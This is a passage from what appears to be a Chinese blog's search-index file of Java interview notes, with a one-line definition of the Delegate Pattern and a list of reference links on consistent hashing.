<h2 id="委派模式（Delegate-Pattern）"><a href="#委派模式（Delegate-Pattern）" class="headerlink" title="委派模式（Delegate Pattern）"></a>委派模式（Delegate Pattern）</h2><p>允许对象组合实现与继承相同的代码重用，负责任务的调用和分配</p>
<h1 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h1><h2 id="一致性hash"><a href="#一致性hash" class="headerlink" title="一致性hash"></a>一致性hash</h2><p><a href="https://segmentfault.com/a/1190000021199728">https://segmentfault.com/a/1190000021199728</a></p>
<p><a href="https://blog.csdn.net/suifeng629/article/details/81567777">https://blog.csdn.net/suifeng629/article/details/81567777</a></p>
<p><a href="https://www.jianshu.com/p/ae4139bdbbc4%EF%BC%88%E4%B8%8D%E9%94%99%EF%BC%89">https://www.jianshu.com/p/ae4139bdbbc4（不错）</a></p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
